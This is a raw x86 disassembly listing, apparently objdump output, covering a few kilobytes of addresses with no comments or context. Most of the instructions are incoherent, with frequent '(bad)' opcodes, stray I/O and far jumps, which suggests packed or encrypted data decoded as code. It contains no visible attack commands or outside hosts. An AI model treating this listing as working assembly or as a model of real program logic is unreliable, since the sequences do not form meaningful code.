  4307d3:	inc    ebx
  4307d4:	hlt    
  4307d5:	addr16 jno 0x43080c
  4307d8:	mov    eax,0xed00587f
  4307dd:	mov    edx,0x369657d4
  4307e2:	dec    ebx
  4307e3:	push   eax
  4307e4:	xchg   esp,eax
  4307e5:	xchg   ecx,eax
  4307e6:	lahf   
  4307e7:	dec    ecx
  4307e8:	loopne 0x4307f4
  4307ea:	int    0xcd
  4307ec:	bound  ebp,QWORD PTR ds:[ebp+0x6f46d2c9]
  4307f3:	jbe    0x430798
  4307f5:	repnz dec esi
  4307f7:	adc    ebp,DWORD PTR [eax+0x6655c415]
  4307fd:	pushf  
  4307fe:	loop   0x4307c8
  430800:	rcl    BYTE PTR [ecx],0xea
  430803:	out    dx,eax
  430804:	and    ch,dl
  430806:	push   cs
  430807:	not    BYTE PTR [edi]
  430809:	(bad)  
  43080a:	aaa    
  43080b:	int3   
  43080c:	fstp   QWORD PTR [eax+ecx*2]
  43080f:	pop    eax
  430810:	pusha  
  430811:	test   eax,0xa6b39cad
  430816:	stc    
  430817:	loope  0x4307c9
  430819:	retf   0x866c
  43081c:	ins    DWORD PTR es:[edi],dx
  43081d:	out    dx,eax
  43081e:	sbb    eax,0x8661a3c5
  430823:	push   edx
  430824:	push   es
  430825:	jl     0x4307d2
  430827:	dec    ecx
  430828:	test   eax,0x17da9e45
  43082d:	mov    eax,ds:0x35216f62
  430832:	lods   eax,DWORD PTR ds:[esi]
  430833:	adc    al,0x2e
  430835:	dec    ecx
  430836:	(bad)  
  430839:	call   0x8631:0x19330931
  430840:	adc    edi,DWORD PTR [ecx]
	...
  4308b2:	add    BYTE PTR [eax],al
  4308b4:	adc    al,0x74
  4308b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4308b7:	push   ebp
  4308b8:	in     al,0xd5
  4308ba:	cmc    
  4308bb:	jne    0x4308f4
  4308bd:	pop    edi
  4308be:	adc    ebp,edx
  4308c0:	jns    0x43088f
  4308c2:	jecxz  0x430863
  4308c4:	push   es
  4308c5:	add    DWORD PTR [edx],eax
  4308c7:	add    dh,dh
  4308c9:	add    BYTE PTR [eax],al
  4308cb:	add    BYTE PTR [edx+0x3b],ah
  4308ce:	mov    bl,0x6d
  4308d0:	xor    eax,0xd78edc16
  4308d5:	lock call 0x775994bc
  4308db:	imul   edx,edx,0xfffffffc
  4308de:	scas   al,BYTE PTR es:[edi]
  4308df:	pop    esi
  4308e0:	not    BYTE PTR [esi-0x72]
  4308e3:	cli    
  4308e4:	mov    al,0xf8
  4308e6:	cld    
  4308e7:	ins    DWORD PTR es:[edi],dx
  4308e8:	imul   esi,eax,0x5b
  4308eb:	jno    0x4308c3
  4308ed:	arpl   WORD PTR [esi+0x6a90bc0],dx
  4308f3:	xchg   esi,eax
  4308f4:	mov    edi,0x955ac239
  4308f9:	push   esi
  4308fa:	push   ebx
  4308fb:	rcr    DWORD PTR [edx],1
  4308fd:	mov    edi,ebx
  4308ff:	jbe    0x43092a
  430901:	jnp    0x430909
  430903:	mov    WORD PTR [eax-0x72c5831],gs
  430909:	add    al,0x7b
  43090b:	xchg   esi,eax
  43090c:	sub    dl,BYTE PTR [esi-0x6fe7240d]
  430912:	arpl   cx,ax
  430914:	jb     0x430976
  430916:	mov    al,0x55
  430918:	mov    ds:0x7ae67779,al
  43091d:	jp     0x4308aa
  43091f:	mov    cl,0x65
  430921:	sbb    eax,0x697942b1
  430926:	mov    edi,?
  430928:	push   ds
  430929:	dec    esi
  43092a:	mov    ebp,0xa8094378
  43092f:	pop    eax
  430930:	inc    esi
  430931:	sahf   
  430932:	jle    0x4308e8
  430934:	ins    DWORD PTR es:[edi],dx
  430935:	pop    es
  430936:	add    BYTE PTR [edx],0x2f
  430939:	mov    ebx,0x5f2a0cab
  43093e:	pop    esi
  43093f:	or     eax,0x9abb41b0
  430944:	stos   DWORD PTR es:[edi],eax
  430945:	mov    DWORD PTR [edx],ebx
  430947:	sub    DWORD PTR [esi],esi
  430949:	dec    esp
  43094a:	mov    edi,0x1d9634a8
  43094f:	inc    esi
  430950:	sub    cl,BYTE PTR [esi]
  430952:	or     esi,esi
  430954:	ins    DWORD PTR es:[edi],dx
  430955:	lods   al,BYTE PTR ds:[esi]
  430956:	sbb    eax,0xe6da252f
  43095b:	fadd   QWORD PTR [edx+0x116b8a9e]
  430961:	in     eax,0x3c
  430963:	dec    edi
  430964:	or     eax,esp
  430966:	xor    al,0x42
  430968:	retf   0xabaa
  43096b:	ja     0x4309e7
  43096d:	outs   dx,BYTE PTR ds:[esi]
  43096e:	out    0xc4,al
  430970:	mov    ch,BYTE PTR [eax+0x53bfd46a]
  430976:	push   es
  430977:	mov    eax,0x121c9843
  43097c:	push   ebp
  43097d:	outs   dx,BYTE PTR ds:[esi]
  43097e:	cmp    bh,BYTE PTR [ebx]
  430980:	xchg   esi,eax
  430981:	fild   DWORD PTR [ebx]
  430983:	xor    cl,BYTE PTR [ecx-0x2d]
  430986:	(bad)  
  430988:	pop    ss
  430989:	push   ebp
  43098a:	mov    DWORD PTR [ebx],0xad0e7906
  430990:	dec    ebp
  430991:	pop    ss
  430992:	sar    DWORD PTR [eax],cl
  430994:	or     BYTE PTR [ecx-0x29],0xff
  430998:	ficom  DWORD PTR [edi+edi*1]
  43099b:	xor    DWORD PTR [edx-0x36],ebp
  43099e:	dec    esp
  43099f:	jle    0x4309e0
  4309a1:	dec    ebp
  4309a2:	and    BYTE PTR [edi-0x75],ch
  4309a5:	out    dx,eax
  4309a6:	pop    ss
  4309a7:	inc    edx
  4309a8:	xor    edi,DWORD PTR [edi]
  4309aa:	xor    BYTE PTR [ebx],ch
  4309ac:	ret    0x7497
  4309af:	jp     0x4309b5
  4309b1:	popa   
  4309b2:	icebp  
  4309b3:	mov    bl,BYTE PTR [esp+ebp*1-0x49]
  4309b7:	and    esi,DWORD PTR [edx+ebx*8+0x732cf520]
  4309be:	(bad)  
  4309c0:	add    DWORD PTR [ecx+0x0],edx
	...
  430a33:	add    BYTE PTR [ebx],bl
  430a35:	out    dx,eax
  430a36:	shl    BYTE PTR [esi],0xf4
  430a39:	aas    
  430a3a:	(bad)  
  430a3b:	out    dx,eax
  430a3c:	fwait
  430a3d:	aaa    
  430a3e:	call   0x3a134037
  430a43:	(bad)  
  430a45:	add    DWORD PTR [edx],eax
  430a47:	add    dh,dh
  430a49:	add    BYTE PTR [eax],al
  430a4b:	add    ch,bl
  430a4d:	mov    al,ds:0x2cfcaed3
  430a52:	(bad)  
  430a53:	in     eax,0xc3
  430a55:	scas   al,BYTE PTR es:[edi]
  430a56:	out    dx,eax
  430a57:	dec    edx
  430a58:	fcomp  DWORD PTR [eax+0x5c3ab199]
  430a5e:	cld    
  430a5f:	mov    WORD PTR [edi+0x2b],gs
  430a62:	mov    ebp,0xd2bd99b5
  430a67:	xchg   ebp,eax
  430a68:	pop    edi
  430a69:	adc    eax,0xd1f6c195
  430a6e:	jle    0x430ae7
  430a70:	hlt    
  430a71:	retf   0x6bd4
  430a74:	cmp    BYTE PTR [ebx-0x15e7cdac],bh
  430a7a:	ret    0x776a
  430a7d:	jg     0x430a9c
  430a7f:	sbb    bl,BYTE PTR [edi-0x1ae20943]
  430a85:	mov    esp,0xf545f61a
  430a8a:	mov    ch,0x4f
  430a8c:	pusha  
  430a8d:	pop    es
  430a8e:	mov    ds:0x98f23e5b,al
  430a93:	in     al,0xd5
  430a95:	xchg   edi,eax
  430a96:	inc    edi
  430a97:	mov    al,0x8
  430a99:	daa    
  430a9a:	pop    edi
  430a9b:	jnp    0x430a41
  430a9d:	out    dx,al
  430a9e:	(bad)  
  430a9f:	mov    eax,0xbe2ca032
  430aa4:	xor    DWORD PTR [ecx-0x49f8e28],eax
  430aaa:	mov    WORD PTR ds:0x4775146c,ds
  430ab0:	scas   al,BYTE PTR es:[edi]
  430ab1:	lods   eax,DWORD PTR ds:[esi]
  430ab2:	fdiv   QWORD PTR [esi+0x2a]
  430ab5:	sub    DWORD PTR [ebx-0x1989a823],0xffffffc5
  430abc:	add    cl,BYTE PTR [edi-0x2c]
  430abf:	es xchg esi,eax
  430ac1:	dec    esi
  430ac2:	jmp    0xeed1:0xb5556eca
  430ac9:	(bad)  
  430aca:	loop   0x430a5e
  430acc:	fdiv   QWORD PTR fs:[esi+0x4f]
  430ad0:	adc    eax,0xc9c24b54
  430ad5:	xchg   edi,eax
  430ad6:	mov    eax,ds:0x5bab8921
  430adb:	sahf   
  430adc:	cmp    edi,DWORD PTR [ebp+0x2b1f6d5c]
  430ae2:	repnz push ebx
  430ae4:	loope  0x430a90
  430ae6:	rcl    bh,1
  430ae8:	(bad)  
  430ae9:	aaa    
  430aea:	mov    al,0xca
  430aec:	jp     0x430a74
  430aee:	inc    edi
  430aef:	cdq    
  430af0:	sub    DWORD PTR [ecx+0x43781bcc],ecx
  430af6:	(bad)  
  430af8:	sub    ebp,DWORD PTR [eax+0x4f9cf361]
  430afe:	mov    ebx,edi
  430b00:	nop
  430b01:	adc    eax,ebp
  430b03:	fstp   TBYTE PTR [edi-0x6ff17169]
  430b09:	or     dl,BYTE PTR [edi+0x65]
  430b0c:	xchg   DWORD PTR [ebx-0x12],eax
  430b0f:	jmp    0xd245ee95
  430b14:	aas    
  430b15:	mov    bh,BYTE PTR [eax]
  430b17:	lods   al,BYTE PTR ds:[esi]
  430b18:	mov    ebx,0xda0f9581
  430b1d:	imul   edx,DWORD PTR [ecx],0xffffff9d
  430b20:	sbb    eax,0xbaa37e8d
  430b25:	mov    gs,WORD PTR [ebp-0x6e]
  430b28:	jmp    0x88ac:0x984c5f64
  430b2f:	jbe    0x430b8f
  430b31:	sbb    ebx,edi
  430b33:	jmp    FWORD PTR [edx-0x6a]
  430b36:	inc    esp
  430b37:	in     eax,0x31
  430b39:	out    0xc9,al
  430b3b:	enter  0x30b5,0x74
  430b3f:	dec    ebx
  430b40:	int3   
  430b41:	adc    BYTE PTR [eax],al
	...
  430bb3:	add    BYTE PTR [ebx],cl
  430bb5:	mov    BYTE PTR [ebx-0x44c45ce7],ah
  430bbb:	call   0x83a9:0x3f4217e6
  430bc2:	outs   dx,DWORD PTR ds:[esi]
  430bc3:	xor    dh,dl
  430bc5:	add    al,BYTE PTR [edx]
  430bc7:	add    dh,dh
  430bc9:	add    BYTE PTR [eax],al
  430bcb:	add    dh,dh
  430bcd:	fimul  DWORD PTR [ecx]
  430bcf:	fwait
  430bd0:	adc    edi,ebx
  430bd2:	out    dx,al
  430bd3:	sub    al,0x7e
  430bd5:	fs loope 0x430ba5
  430bd8:	je     0x430bc6
  430bda:	mov    esi,DWORD PTR [eax+0x7e]
  430bdd:	mov    dh,0x6d
  430bdf:	outs   dx,BYTE PTR ds:[esi]
  430be0:	mov    ah,0x7
  430be2:	adc    dh,BYTE PTR [eax+edx*1-0x7cc011c0]
  430be9:	pcmpgtw mm4,QWORD PTR [ecx]
  430bec:	inc    ebp
  430bed:	mov    edi,0x8a2860bf
  430bf2:	xchg   esi,eax
  430bf3:	or     al,0x3e
  430bf5:	xchg   ecx,eax
  430bf6:	sub    dl,BYTE PTR [edi]
  430bf8:	call   0x1ea6e728
  430bfd:	test   bl,ah
  430bff:	jbe    0x430b92
  430c01:	aam    0x95
  430c03:	shr    DWORD PTR [edx+0x4e],1
  430c06:	mov    ds:0xb9ccb062,al
  430c0b:	xor    BYTE PTR [esi+ebx*1+0x75],al
  430c0f:	cwde   
  430c10:	clc    
  430c11:	shr    bl,0x5f
  430c14:	adc    DWORD PTR [esi],esi
  430c16:	sbb    eax,0x53aa91ef
  430c1b:	jg     0x430bdf
  430c1d:	retf   0xf71f
  430c20:	enter  0x8cb4,0x8d
  430c24:	pusha  
  430c25:	mov    bl,BYTE PTR [edi+0x6ec64ac6]
  430c2b:	repz xchg esp,eax
  430c2d:	mov    al,ds:0xabde40da
  430c32:	inc    ebx
  430c33:	dec    eax
  430c34:	les    ebp,FWORD PTR [edx-0x214dbe5a]
  430c3a:	dec    eax
  430c3b:	mov    esi,0x26365b22
  430c40:	pop    ecx
  430c41:	call   0xc325232f
  430c46:	cli    
  430c47:	dec    ebp
  430c48:	xchg   ecx,eax
  430c49:	scas   eax,DWORD PTR es:[edi]
  430c4a:	(bad)  
  430c4b:	imul   ebp,DWORD PTR [edx+0x21],0x4bb9d7ee
  430c52:	or     eax,0xa155d016
  430c57:	aas    
  430c58:	or     bl,ch
  430c5a:	cmp    BYTE PTR [ebx-0x3119086b],ch
  430c60:	add    al,0xe3
  430c62:	jl     0x430c8e
  430c64:	sbb    al,0x15
  430c66:	(bad)  
  430c69:	push   es
  430c6a:	fisub  WORD PTR ds:0xb3e62a80
  430c70:	pop    ebp
  430c71:	jns    0x430c6d
  430c73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430c74:	and    eax,DWORD PTR [esp+ecx*2-0x5c193bd9]
  430c7b:	push   ss
  430c7c:	es jns 0x430c2e
  430c7f:	cwde   
  430c80:	out    dx,al
  430c81:	xlat   BYTE PTR ds:[ebx]
  430c82:	data16 ins BYTE PTR es:[edi],dx
  430c84:	push   cs
  430c85:	out    0x1f,al
  430c87:	or     edi,esp
  430c89:	push   ecx
  430c8a:	xchg   ebp,eax
  430c8b:	xchg   ebx,eax
  430c8c:	shr    BYTE PTR [ebx+0x77],0x2d
  430c90:	repnz adc bl,BYTE PTR [esi+ebx*4+0x69]
  430c95:	outs   dx,BYTE PTR ds:[esi]
  430c96:	fs das 
  430c98:	mov    ebp,0x656f05b1
  430c9d:	mov    edi,0xfdc28d52
  430ca2:	push   ebx
  430ca3:	icebp  
  430ca4:	sub    al,0xbf
  430ca6:	mov    eax,0x6326e3b0
  430cab:	push   ebx
  430cac:	fiadd  DWORD PTR [eax-0x351c524f]
  430cb2:	sbb    DWORD PTR [esp+eax*1-0x1c64acaa],0x5e00434c
  430cbd:	fld    QWORD PTR [ecx+0x42]
  430cc0:	ret    0xe7
	...
  430d33:	add    BYTE PTR [eax-0x40],cl
  430d36:	ret    0xcaf0
  430d39:	bnd jp 0x430d34
  430d3c:	ror    BYTE PTR [ecx],1
  430d3e:	cdq    
  430d3f:	jl     0x430d67
  430d41:	jmp    0x2:0x3e8da52
  430d48:	test   BYTE PTR [eax],0x0
  430d4b:	add    BYTE PTR [ebx+0x5f757793],dl
  430d51:	or     eax,DWORD PTR ds:0xd0cdb9a9
  430d57:	or     al,0xa1
  430d59:	addr16 jno 0x430ce4
  430d5c:	mov    esi,0x9b46f58d
  430d61:	and    al,0x9c
  430d63:	push   eax
  430d64:	jno    0x430d31
  430d66:	push   DWORD PTR [eax-0x19]
  430d69:	mov    WORD PTR [eax],?
  430d6b:	push   ebp
  430d6c:	dec    edx
  430d6d:	pop    es
  430d6e:	shl    BYTE PTR [esi+0x38],0xeb
  430d72:	lods   eax,DWORD PTR ds:[esi]
  430d73:	xchg   edi,eax
  430d74:	pop    ds
  430d75:	ja     0x430df2
  430d77:	mov    esi,0x31cf3a3
  430d7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430d7d:	das    
  430d7e:	int3   
  430d7f:	test   BYTE PTR [esi],bl
  430d81:	xchg   edi,eax
  430d82:	mov    ch,0xd8
  430d84:	data16 aad 0xf7
  430d87:	push   edx
  430d88:	push   0x91c05ee4
  430d8d:	jg     0x430de1
  430d8f:	and    eax,0x2ac793e7
  430d94:	dec    BYTE PTR [edx]
  430d96:	jmp    0x6546:0x686caa00
  430d9d:	loopne 0x430dc7
  430d9f:	adc    eax,0xeed8002a
  430da4:	jp     0x430d35
  430da6:	pop    es
  430da7:	pcmpeqw mm0,mm4
  430daa:	imul   edx,DWORD PTR [ebp+0x6a9a0980],0xffffff91
  430db1:	popf   
  430db2:	mov    al,ds:0xf73303a6
  430db7:	add    BYTE PTR ds:0xd7773fb9,al
  430dbd:	mov    esp,edx
  430dbf:	out    dx,al
  430dc0:	adc    BYTE PTR [edi+0x3c],0xa7
  430dc4:	pop    edi
  430dc5:	add    edx,edx
  430dc7:	js     0x430da4
  430dc9:	sub    DWORD PTR [eax-0x4caf44dc],ebp
  430dcf:	cmp    esp,DWORD PTR [edi]
  430dd1:	bswap  ecx
  430dd3:	call   0xac6af4fe
  430dd8:	push   esp
  430dd9:	push   ebx
  430dda:	and    eax,0xc5c9ee0d
  430ddf:	cmove  esi,eax
  430de2:	ret    0x46eb
  430de5:	call   0xcdca8f4f
  430dea:	dec    esi
  430deb:	adc    DWORD PTR [edi],ebx
  430ded:	je     0x430df9
  430def:	push   edi
  430df0:	sub    eax,0x692bf1ed
  430df5:	adc    eax,0xec4299de
  430dfa:	pop    ecx
  430dfb:	(bad)  
  430dfc:	in     eax,0xe2
  430dfe:	scas   al,BYTE PTR es:[edi]
  430dff:	out    0xf2,eax
  430e01:	icebp  
  430e02:	mov    edi,0x7369e16e
  430e07:	lds    ebp,FWORD PTR [ecx]
  430e09:	push   edi
  430e0a:	ret    
  430e0b:	xlat   BYTE PTR ds:[ebx]
  430e0c:	fs sahf 
  430e0e:	push   ds
  430e0f:	adc    DWORD PTR [esi+0x6e],ecx
  430e12:	xor    al,0xc7
  430e14:	enter  0xbe18,0x19
  430e18:	shl    BYTE PTR [edx+0x75],cl
  430e1b:	pop    ss
  430e1c:	fimul  DWORD PTR [esp+ebx*4]
  430e1f:	fst    st(7)
  430e21:	fld    DWORD PTR [edi-0x53]
  430e24:	jmp    0x3339812c
  430e29:	jmp    0x3ee2c0f9
  430e2e:	jno    0x430e0f
  430e30:	or     al,0xcc
  430e32:	xchg   esp,eax
  430e33:	fist   WORD PTR [edi+0x77d4054]
  430e39:	not    BYTE PTR [eax]
  430e3b:	cld    
  430e3c:	in     eax,0x38
  430e3e:	cmp    eax,0x7a0cdc
	...
  430eb3:	add    BYTE PTR [edi+eiz*2],al
  430eb6:	std    
  430eb7:	aaa    
  430eb8:	(bad)  
  430eb9:	mov    edi,0x8a6677ce
  430ebe:	retf   
  430ebf:	jne    0x430e7c
  430ec1:	add    ecx,DWORD PTR [esi-0x4a]
  430ec4:	fiadd  WORD PTR [edx+eax*1]
  430ec7:	add    BYTE PTR [ebp+0x0],ch
  430eca:	add    BYTE PTR [eax],al
  430ecc:	jmp    0x38ce:0xa175d63a
  430ed3:	jbe    0x430ed9
  430ed5:	test   ch,bh
  430ed7:	jne    0x430edc
  430ed9:	jle    0x430e8f
  430edb:	das    
  430edc:	lds    eax,FWORD PTR [eax]
  430ede:	arpl   bx,di
  430ee0:	aad    0xac
  430ee2:	mov    ah,0x93
  430ee4:	cmp    cl,BYTE PTR [ecx-0x31]
  430ee7:	hlt    
  430ee8:	data16 fisub WORD PTR [ebp-0x18baf3c]
  430eef:	rcl    dh,1
  430ef1:	mov    ah,0xea
  430ef3:	xor    BYTE PTR [esi+0x1],0xa0
  430ef7:	xor    eax,0x6c290de9
  430efc:	sti    
  430efd:	mov    al,BYTE PTR [edx+0x6a17f117]
  430f03:	push   0xc50fb40b
  430f08:	cmp    al,BYTE PTR es:[ecx]
  430f0b:	xchg   edx,eax
  430f0c:	sahf   
  430f0d:	dec    ecx
  430f0e:	rcpps  xmm3,XMMWORD PTR [ecx+0x6bb17b03]
  430f15:	addr16 int3 
  430f17:	xchg   edx,eax
  430f18:	push   ecx
  430f19:	xor    ah,ah
  430f1b:	rol    DWORD PTR [ebx],cl
  430f1d:	jo     0x430f4d
  430f1f:	pop    esi
  430f20:	add    BYTE PTR [ebp-0x73],ah
  430f23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430f24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430f25:	outs   dx,DWORD PTR ds:[esi]
  430f26:	jecxz  0x430eee
  430f28:	jmp    0x430eca
  430f2a:	hlt    
  430f2b:	pop    ebp
  430f2c:	stos   DWORD PTR es:[edi],eax
  430f2d:	fidivr WORD PTR [ebp-0x57]
  430f30:	jns    0x430f01
  430f32:	mov    ah,0x5d
  430f34:	stos   DWORD PTR es:[edi],eax
  430f35:	jecxz  0x430ef3
  430f37:	inc    ebp
  430f38:	sub    BYTE PTR [eax],al
	...
  430fb2:	add    BYTE PTR [eax],al
  430fb4:	dec    ebp
  430fb5:	push   ebp
  430fb6:	mov    DWORD PTR [ebx-0x7e9f13f8],ecx
  430fbc:	mov    esp,ebp
  430fbe:	or     al,ah
  430fc0:	dec    ebp
  430fc1:	add    bh,al
  430fc3:	add    BYTE PTR [eax],cl
  430fc5:	add    BYTE PTR [eax],al
  430fc7:	mov    DWORD PTR [eax],0x3ef44545
  430fcd:	add    BYTE PTR ss:[ebp-0x70b6375],al
  430fd4:	retf   
  430fd5:	(bad)  
  430fd6:	enter  0x4d45,0xb8
  430fda:	mov    edi,DWORD PTR [ecx]
  430fdc:	hlt    
  430fdd:	test   ebx,ecx
  430fdf:	pushf  
  430fe0:	enter  0x4df8,0x8b
  430fe4:	mov    DWORD PTR [ebp+0x8],0x894708
  430feb:	inc    ebp
  430fec:	mov    ebp,0xff8bfffc
  430ff1:	dec    ebp
  430ff2:	mov    ch,0xf4
  430ff4:	call   DWORD PTR [ebx-0x1]
  430ff7:	mov    ebx,0x8005122
  430ffc:	call   DWORD PTR [ecx+0x8]
  430fff:	pop    es
  431000:	jmp    0xb8:0x9cb4533
  431007:	cdq    
  431008:	mov    esi,DWORD PTR [edx-0xc]
  43100b:	xor    al,bl
  43100d:	add    BYTE PTR [ecx+0x3c83203],bl
  431013:	mov    DWORD PTR [ecx+0x45c4084d],ecx
  431019:	mov    eax,DWORD PTR [ebx-0xb87b3]
  43101f:	xor    eax,DWORD PTR [eax]
  431021:	retf   
  431022:	ret    
  431023:	add    eax,esi
  431025:	enter  0x8945,0x64
  431029:	dec    ebp
  43102a:	sbb    ah,cl
  43102c:	add    BYTE PTR [ebx-0xb87b277],cl
  431032:	dec    DWORD PTR [ebx-0xbcfb275]
  431038:	test   DWORD PTR [ebx],esi
  43103a:	dec    ebx
  43103c:	inc    DWORD PTR [ebx]
  43103e:	inc    eax
  43103f:	enter  0x8989,0x64
  431043:	(bad)  
  431044:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  431048:	cld    
  431049:	dec    DWORD PTR [ebp-0xa90001]
  43104f:	push   edi
  431050:	mov    BYTE PTR [edx+0x1],ch
  431053:	and    BYTE PTR [eax],al
  431055:	pop    ecx
  431056:	inc    ebp
  431057:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  43105d:	push   0xffffff89
  43105f:	pop    ecx
  431060:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431061:	dec    ebp
  431062:	add    BYTE PTR [ecx+0x45fc088b],cl
  431068:	jne    0x4310b2
  43106a:	lea    eax,[eax]
  43106c:	fs (bad) 
  43106e:	dec    DWORD PTR [eax]
  431070:	mov    DWORD PTR [eax],eax
  431072:	test   al,0x0
  431074:	add    BYTE PTR [ebp-0x18],cl
  431077:	xor    ebp,DWORD PTR [edx]
  431079:	add    eax,DWORD PTR [eax]
  43107b:	mov    eax,eax
  43107d:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  431084:	inc    ebp
  431085:	mov    DWORD PTR [ebx+0x459408],ecx
  43108b:	popa   
  43108c:	mov    esp,DWORD PTR [ebp-0x75]
  43108f:	(bad)  
  431090:	cld    
  431091:	inc    eax
  431092:	cmp    bh,0x1
  431095:	lea    eax,[eax]
  431097:	and    BYTE PTR [eax],al
  431099:	inc    DWORD PTR [ecx-0x18]
  43109c:	mov    ecx,DWORD PTR [ebx]
  43109e:	cld    
  43109f:	add    BYTE PTR [ecx+0x75014d],cl
  4310a5:	(bad)  
  4310a6:	xchg   ebp,eax
  4310a7:	sar    bh,1
  4310a9:	inc    eax
  4310aa:	inc    DWORD PTR [eax]
  4310ac:	mov    eax,DWORD PTR [ebp-0x4]
  4310af:	xor    edx,DWORD PTR [edx+0x7201be]
  4310b5:	add    BYTE PTR [edx],dl
  4310b7:	(bad)  
  4310b8:	nop
  4310b9:	inc    ebp
  4310ba:	add    BYTE PTR [ebx-0x5afb0c00],cl
  4310c0:	mov    al,0xff
  4310c2:	add    bh,bh
  4310c4:	add    BYTE PTR [ebx],dh
  4310c6:	inc    DWORD PTR [ebx]
  4310c8:	sbb    al,0x89
  4310ca:	jne    0x4310a8
  4310cc:	mov    esp,DWORD PTR [ecx+0x4500fc]
  4310d2:	mov    eax,DWORD PTR [ebp-0xff0048]
  4310d8:	mov    DWORD PTR [eax-0x70],0xe870e989
  4310df:	inc    DWORD PTR [ebp-0x75]
  4310e2:	(bad)  [esi+ebp*8]
  4310e5:	test   DWORD PTR [esi-0x1],esp
  4310e8:	inc    ebp
  4310e9:	(bad)  
  4310ea:	aas    
  4310eb:	inc    ebp
  4310ec:	(bad)  
  4310ed:	lea    edi,[eax+edi*2-0x1]
  4310f1:	inc    edi
  4310f3:	mov    DWORD PTR [ecx],edi
  4310f5:	mov    al,ds:0x8b8000c7
  4310fa:	call   0x45d0f3fb
  4310ff:	(bad)  
  431100:	out    dx,al
  431101:	(bad)  
  431102:	fisttp WORD PTR [eax+0x8801c7]
  431108:	jecxz  0x43114f
  43110a:	call   0xe83f570e
  43110f:	lea    edi,[edi]
  431111:	(bad)  
  431112:	call   0xcb3c16
  431117:	add    DWORD PTR [ebx-0x7f570400],ecx
  43111d:	add    BYTE PTR [ecx],al
  43111f:	test   DWORD PTR [eax],eax
  431121:	wrmsr  
  431123:	jae    0x431112
  431125:	add    BYTE PTR [eax],al
  431127:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  43112d:	add    esp,edi
  43112f:	add    BYTE PTR [eax+0x450108],al
  431135:	mov    edi,DWORD PTR [ebp-0x6c]
  431138:	add    DWORD PTR [eax],0x4
  43113b:	mov    eax,DWORD PTR [ebp+0x3]
  43113e:	mov    edi,DWORD PTR [esp+edi*8]
  431141:	dec    ebp
  431142:	nop
  431143:	mov    eax,DWORD PTR [ecx]
  431145:	fadd   DWORD PTR [eax]
  431147:	add    BYTE PTR [esi],al
  431149:	lea    eax,[eax]
  43114b:	pusha  
  43114c:	push   eax
  43114d:	inc    DWORD PTR [ebp+0x52]
  431150:	call   DWORD PTR [ebp-0x7b]
  431153:	mov    esi,DWORD PTR [ebp-0x74]
  431156:	mov    eax,DWORD PTR [eax]
  431158:	cld    
  431159:	mov    eax,DWORD PTR [eax+0x880103]
  43115f:	add    BYTE PTR [ebp+0x6a],bh
  431162:	cmp    edi,0x10
  431165:	mov    WORD PTR [ebp+0x0],es
  431168:	mov    edx,DWORD PTR [edx-0x4]
  43116b:	push   ecx
  43116c:	nop
  43116d:	inc    DWORD PTR [ecx]
  43116f:	cld    
  431170:	add    BYTE PTR [ebp-0x24],bh
  431173:	mov    eax,DWORD PTR [eax]
  431175:	cld    
  431176:	push   eax
  431177:	nop
  431178:	inc    ebp
  431179:	add    edi,edi
  43117b:	add    BYTE PTR [ebx+0x4de2f445],cl
  431181:	jmp    0xe33b:0x9403c733
  431188:	movntq QWORD PTR [esi],mm6
  43118b:	mov    DWORD PTR [eax],0xb87e8b98
  431191:	test   ebx,eax
  431193:	jmp    DWORD PTR [edi-0x1]
  431196:	int    0xe9
  431198:	sub    esp,esi
  43119a:	add    eax,DWORD PTR [ebp-0x30]
  43119d:	fild   WORD PTR [ebp+0x3f]
  4311a0:	cmp    eax,edi
  4311a2:	je     0xcc43f7c4
  4311a8:	mov    DWORD PTR [ebp-0x28],0xdb00eb
  4311af:	(bad)  
  4311b0:	jne    0x43113e
  4311b2:	mov    ebx,ecx
  4311b4:	cld    
  4311b5:	jle    0x4311fc
  4311b7:	cmp    ecx,DWORD PTR [ebx+0x50b400]
  4311bd:	inc    ebp
  4311be:	call   0xeb3b4e
  4311c3:	add    BYTE PTR [ebx-0x7f170301],cl
  4311c9:	add    DWORD PTR es:[eax],eax
  4311cc:	add    al,al
  4311ce:	xor    BYTE PTR [eax+0x41],dl
  4311d1:	inc    ebp
  4311d2:	add    BYTE PTR [ebx+0xfcd88b],cl
  4311d8:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  4311de:	add    DWORD PTR [ecx+0x458be845],ecx
  4311e4:	fmul   DWORD PTR [ebx+0x8bb800]
  4311ea:	cld    
  4311eb:	call   0xd83cb0
  4311f0:	dec    DWORD PTR [ebx+0x1090e8ff]
  4311f6:	add    al,al
  4311f8:	push   eax
  4311f9:	es inc ebp
  4311fb:	inc    ebp
  4311fc:	mov    ecx,DWORD PTR [ebx+0xd89c]
  431202:	dec    DWORD PTR [ebx-0x3ff70301]
  431208:	mov    DWORD PTR gs:[eax],eax
  43120b:	call   0x8b6b57d0
  431210:	inc    ebp
  431211:	mov    eax,0xe8d8008b
  431216:	add    BYTE PTR [ecx],ch
  431218:	mov    eax,DWORD PTR [eax]
  43121a:	cld    
  43121b:	mov    eax,eax
  43121d:	call   0x462b2277
  431222:	sub    DWORD PTR [ebx-0x3c743000],ecx
  431228:	cld    
  431229:	mov    BYTE PTR [eax+0x8401c1],0x1
  431230:	xor    BYTE PTR [eax],al
  431232:	push   edi
  431233:	inc    ebp
  431234:	mov    DWORD PTR [ebx],esi
  431236:	in     al,0xb9
  431238:	inc    ebp
  431239:	lea    ecx,[ebx-0x3c370301]
  43123f:	dec    ebp
  431240:	cdq    
  431241:	mov    esi,DWORD PTR [edx]
  431243:	or     BYTE PTR [ebx],al
  431245:	ror    DWORD PTR [ebp-0xfebf79],0x0
  43124c:	call   0x433b96
  431251:	add    BYTE PTR [ebx+0x75fcf4ff],cl
  431257:	jge    0x43128c
  431259:	mov    eax,DWORD PTR [ebx]
  43125b:	cld    
  43125c:	lea    edx,[eax+0xff0120]
  431262:	call   0x433bf6
  431267:	push   eax
  431268:	inc    DWORD PTR [ebp-0x1c]
